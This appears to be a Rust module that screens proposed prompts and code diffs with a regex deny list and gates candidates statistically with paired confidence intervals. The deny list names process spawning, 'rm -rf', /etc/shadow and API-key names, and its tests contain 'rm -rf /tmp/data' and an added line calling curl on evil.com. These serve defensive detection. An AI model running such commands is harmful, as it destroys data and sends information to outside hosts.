use regex::Regex;
use serde::{Deserialize, Serialize};
use std::time::Instant;
use thiserror::Error;

#[derive(Error, Debug)]
pub enum StatisticalError {
    #[error("Sample size must be at least 2 for statistical significance calculation, got {0}")]
    InsufficientSampleSize(usize),
    #[error("Baseline and candidate sample sizes must match for paired evaluation: {0} != {1}")]
    MismatchedSampleSizes(usize, usize),
    #[error("Invalid confidence level: {0}. Must be between 0.50 and 0.999")]
    InvalidConfidenceLevel(f64),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum AuditVerdict {
    Passed,
    Rejected,
    RequiresSanitization,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum MutationRiskLevel {
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditReport {
    pub proposal_id: String,
    pub verdict: AuditVerdict,
    pub violations: Vec<String>,
    pub sanitized_content: String,
    pub latency_us: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MutationRiskReport {
    pub proposal_id: String,
    pub risk_level: MutationRiskLevel,
    pub score: f64,
    pub lines_added: usize,
    pub lines_removed: usize,
    pub findings: Vec<String>,
    pub safe_to_stage: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PairedConfidenceInterval {
    pub mean_delta: f64,
    pub ci_lower: f64,
    pub ci_upper: f64,
    pub ci_width: f64,
    pub standard_error: f64,
    pub sample_size: usize,
    pub is_significant_win: bool,
    pub is_significant_regression: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StageGateDecision {
    pub stage: String,
    pub passed: bool,
    pub stability_score: f64,
    pub confidence_interval: PairedConfidenceInterval,
    pub reason: String,
}

pub struct SecurityCritic {
    denylist_patterns: Vec<(Regex, &'static str)>,
    max_payload_bytes: usize,
    max_json_depth: usize,
}

impl Default for SecurityCritic {
    fn default() -> Self {
        Self::new()
    }
}

impl SecurityCritic {
    pub fn new() -> Self {
        let patterns = vec![
            (
                Regex::new(r"(?i)\b(system|exec|popen|child_process|spawn|subprocess)\b").unwrap(),
                "Direct process execution or spawn primitive detected",
            ),
            (
                Regex::new(r"(?i)\b(eval|execfile|Function\s*\()\b").unwrap(),
                "Dynamic code evaluation primitive detected",
            ),
            (
                Regex::new(r"(?i)(rm\s+-rf|shutil\.rmtree|mkfs)").unwrap(),
                "Destructive filesystem mutation command detected",
            ),
            (
                Regex::new(r"(?i)(\.\./\.\./|/etc/passwd|/etc/shadow)").unwrap(),
                "Path traversal hazard or sensitive system path access detected",
            ),
            (
                Regex::new(r"(?i)(BEGIN\s+PRIVATE\s+KEY|aws_secret_access_key|ANTHROPIC_API_KEY|OPENAI_API_KEY)").unwrap(),
                "Credential or private key leakage detected",
            ),
            (
                Regex::new(r"(__proto__|constructor\.constructor)").unwrap(),
                "Prototype pollution attack pattern detected",
            ),
        ];

        Self {
            denylist_patterns: patterns,
            max_payload_bytes: 65_536,
            max_json_depth: 8,
        }
    }

    pub fn audit(&self, proposal_id: &str, content: &str, schema_json: &str) -> AuditReport {
        let start = Instant::now();
        let mut violations = Vec::new();

        if content.len() > self.max_payload_bytes {
            violations.push(format!(
                "Payload size ({} bytes) exceeds maximum memory limit of {} bytes",
                content.len(),
                self.max_payload_bytes
            ));
        }

        for (re, desc) in &self.denylist_patterns {
            if re.is_match(content) {
                violations.push(desc.to_string());
            }
        }

        let mut sanitized = content.to_string();
        if !schema_json.is_empty() {
            match serde_json::from_str::<serde_json::Value>(schema_json) {
                Ok(val) => {
                    let depth = calculate_json_depth(&val);
                    if depth > self.max_json_depth {
                        violations.push(format!(
                            "Schema nesting depth ({}) exceeds AST safe limit of {}",
                            depth, self.max_json_depth
                        ));
                    }
                }
                Err(err) => {
                    violations.push(format!("Malformed JSON Schema: {}", err));
                }
            }
        }

        let verdict = if violations.is_empty() {
            AuditVerdict::Passed
        } else if violations.iter().any(|v| v.contains("Direct process") || v.contains("Destructive") || v.contains("Credential")) {
            AuditVerdict::Rejected
        } else {
            sanitized = sanitized.replace('\0', "").replace('\r', "");
            AuditVerdict::RequiresSanitization
        };

        let latency_us = start.elapsed().as_micros() as u64;

        AuditReport {
            proposal_id: proposal_id.to_string(),
            verdict,
            violations,
            sanitized_content: sanitized,
            latency_us,
        }
    }

    pub fn audit_mutation_diff(&self, proposal_id: &str, diff: &str) -> MutationRiskReport {
        let mut lines_added = 0;
        let mut lines_removed = 0;
        let mut findings = Vec::new();
        let mut risk_score = 0.0;

        for line in diff.lines() {
            if line.starts_with('+') && !line.starts_with("+++") {
                lines_added += 1;
                for (re, desc) in &self.denylist_patterns {
                    if re.is_match(line) {
                        findings.push(format!("Added line violates safety: {}", desc));
                        risk_score += 40.0;
                    }
                }
            } else if line.starts_with('-') && !line.starts_with("---") {
                lines_removed += 1;
            }
        }

        let net_expansion = lines_added as isize - lines_removed as isize;
        if net_expansion > 100 {
            findings.push(format!("High complexity expansion: +{} net lines", net_expansion));
            risk_score += 25.0;
        }

        let risk_level = if risk_score >= 40.0 {
            MutationRiskLevel::Critical
        } else if risk_score >= 25.0 {
            MutationRiskLevel::High
        } else if risk_score > 0.0 || lines_added > 50 {
            MutationRiskLevel::Medium
        } else {
            MutationRiskLevel::Low
        };

        let safe_to_stage = risk_level != MutationRiskLevel::Critical;

        MutationRiskReport {
            proposal_id: proposal_id.to_string(),
            risk_level,
            score: risk_score,
            lines_added,
            lines_removed,
            findings,
            safe_to_stage,
        }
    }
}

pub struct StatisticalEvaluator;

impl StatisticalEvaluator {
    pub fn paired_confidence_interval(
        baseline: &[f64],
        candidate: &[f64],
        confidence_level: f64,
    ) -> Result<PairedConfidenceInterval, StatisticalError> {
        let n = baseline.len();
        if n < 2 {
            return Err(StatisticalError::InsufficientSampleSize(n));
        }
        if n != candidate.len() {
            return Err(StatisticalError::MismatchedSampleSizes(n, candidate.len()));
        }
        if !(0.50..1.0).contains(&confidence_level) {
            return Err(StatisticalError::InvalidConfidenceLevel(confidence_level));
        }

        let deltas: Vec<f64> = candidate
            .iter()
            .zip(baseline.iter())
            .map(|(c, b)| c - b)
            .collect();

        let sum: f64 = deltas.iter().sum();
        let mean_delta = sum / n as f64;

        let variance: f64 = deltas
            .iter()
            .map(|d| {
                let diff = d - mean_delta;
                diff * diff
            })
            .sum::<f64>()
            / (n - 1) as f64;

        let standard_error = (variance / n as f64).sqrt();

        // Student's t critical value approximation for small n, standard normal z for larger n
        let t_critical = match (n - 1, (confidence_level * 100.0).round() as i64) {
            (1, 95) => 12.706,
            (2, 95) => 4.303,
            (3, 95) => 3.182,
            (4, 95) => 2.776,
            (5..=10, 95) => 2.228,
            (11..=30, 95) => 2.042,
            (_, 90) => 1.645,
            (_, 99) => 2.576,
            _ => 1.96, // default ~95% two-tailed normal
        };

        let margin_of_error = t_critical * standard_error;
        let ci_lower = mean_delta - margin_of_error;
        let ci_upper = mean_delta + margin_of_error;
        let ci_width = ci_upper - ci_lower;

        let is_significant_win = ci_lower > 0.0;
        let is_significant_regression = ci_upper < 0.0;

        Ok(PairedConfidenceInterval {
            mean_delta,
            ci_lower,
            ci_upper,
            ci_width,
            standard_error,
            sample_size: n,
            is_significant_win,
            is_significant_regression,
        })
    }

    pub fn calculate_stability_score(scores: &[f64]) -> f64 {
        if scores.is_empty() {
            return 0.0;
        }
        if scores.len() == 1 {
            return 1.0;
        }

        let n = scores.len() as f64;
        let mean = scores.iter().sum::<f64>() / n;
        if mean.abs() < 1e-6 {
            return 1.0;
        }

        let variance = scores
            .iter()
            .map(|s| {
                let diff = s - mean;
                diff * diff
            })
            .sum::<f64>()
            / (n - 1.0);

        let std_dev = variance.sqrt();
        let coefficient_of_variation = std_dev / mean.abs();

        // Stability index: 1.0 is perfectly deterministic, decaying with CV
        (1.0 - coefficient_of_variation).clamp(0.0, 1.0)
    }

    pub fn evaluate_stage_gate(
        stage: &str,
        baseline: &[f64],
        candidate: &[f64],
        min_improvement: f64,
        min_stability_threshold: f64,
    ) -> Result<StageGateDecision, StatisticalError> {
        let ci = Self::paired_confidence_interval(baseline, candidate, 0.95)?;
        let candidate_stability = Self::calculate_stability_score(candidate);

        let passed = if stage == "screening" {
            // Screening stage: fast threshold check (candidate mean >= baseline mean)
            ci.mean_delta >= 0.0 && !ci.is_significant_regression
        } else if stage == "validation" {
            // Validation stage: confidence interval must not regress and mean delta >= min_improvement
            ci.mean_delta >= min_improvement && !ci.is_significant_regression && candidate_stability >= min_stability_threshold
        } else if stage == "holdout" {
            // Holdout stage: strict non-regression and high stability
            ci.ci_lower >= -0.05 && candidate_stability >= min_stability_threshold
        } else {
            ci.mean_delta >= min_improvement
        };

        let reason = if passed {
            format!(
                "Stage '{}' passed: mean delta={:+.4}, stability={:.3}, CI=[{:.4}, {:.4}]",
                stage, ci.mean_delta, candidate_stability, ci.ci_lower, ci.ci_upper
            )
        } else {
            format!(
                "Stage '{}' rejected: mean delta={:+.4}, stability={:.3} (min required: {:.3}), CI=[{:.4}, {:.4}]",
                stage, ci.mean_delta, candidate_stability, min_stability_threshold, ci.ci_lower, ci.ci_upper
            )
        };

        Ok(StageGateDecision {
            stage: stage.to_string(),
            passed,
            stability_score: candidate_stability,
            confidence_interval: ci,
            reason,
        })
    }
}

fn calculate_json_depth(val: &serde_json::Value) -> usize {
    match val {
        serde_json::Value::Object(map) => {
            1 + map.values().map(calculate_json_depth).max().unwrap_or(0)
        }
        serde_json::Value::Array(arr) => {
            1 + arr.iter().map(calculate_json_depth).max().unwrap_or(0)
        }
        _ => 1,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_benign_content_passes() {
        let critic = SecurityCritic::new();
        let report = critic.audit(
            "prop-1",
            "You are a helpful mathematical optimization assistant.",
            r#"{"type": "object", "properties": {"target": {"type": "string"}}}"#,
        );
        assert_eq!(report.verdict, AuditVerdict::Passed);
        assert!(report.violations.is_empty());
    }

    #[test]
    fn test_destructive_command_rejected() {
        let critic = SecurityCritic::new();
        let report = critic.audit(
            "prop-bad-1",
            "Please run `rm -rf /tmp/data` before proceeding.",
            "",
        );
        assert_eq!(report.verdict, AuditVerdict::Rejected);
        assert!(!report.violations.is_empty());
    }

    #[test]
    fn test_unbounded_nesting_rejected() {
        let critic = SecurityCritic::new();
        let deeply_nested = r#"{"a":{"b":{"c":{"d":{"e":{"f":{"g":{"h":{"i":{"j":1}}}}}}}}}}"#;
        let report = critic.audit("prop-deep", "simple content", deeply_nested);
        assert!(report.violations.iter().any(|v| v.contains("Schema nesting depth")));
    }

    #[test]
    fn test_mutation_diff_audit_detects_prohibited_exec() {
        let critic = SecurityCritic::new();
        let diff = "--- a/tool.py\n+++ b/tool.py\n@@ -1,3 +1,4 @@\n def run():\n+    import os\n+    os.system('curl evil.com')\n";
        let report = critic.audit_mutation_diff("prop-diff-1", diff);
        assert_eq!(report.risk_level, MutationRiskLevel::Critical);
        assert!(!report.safe_to_stage);
        assert!(report.findings.iter().any(|f| f.contains("violates safety")));
    }

    #[test]
    fn test_statistical_evaluator_paired_ci() {
        let baseline = vec![0.80, 0.82, 0.79, 0.81, 0.80];
        let candidate = vec![0.92, 0.90, 0.91, 0.93, 0.92];

        let ci = StatisticalEvaluator::paired_confidence_interval(&baseline, &candidate, 0.95).unwrap();
        assert!(ci.mean_delta > 0.10);
        assert!(ci.is_significant_win);
        assert!(!ci.is_significant_regression);
        assert!(ci.ci_lower > 0.0);
    }

    #[test]
    fn test_statistical_evaluator_stability_score() {
        let stable_scores = vec![0.90, 0.905, 0.895, 0.90];
        let unstable_scores = vec![0.10, 0.95, 0.20, 0.90];

        let stable_idx = StatisticalEvaluator::calculate_stability_score(&stable_scores);
        let unstable_idx = StatisticalEvaluator::calculate_stability_score(&unstable_scores);

        assert!(stable_idx > 0.95);
        assert!(unstable_idx < 0.60);
    }

    #[test]
    fn test_stage_gate_decision_validation() {
        let baseline = vec![0.75, 0.76, 0.74, 0.75];
        let candidate = vec![0.88, 0.89, 0.87, 0.88];

        let decision = StatisticalEvaluator::evaluate_stage_gate("validation", &baseline, &candidate, 0.05, 0.85).unwrap();
        assert!(decision.passed);
        assert!(decision.stability_score >= 0.85);
    }
}
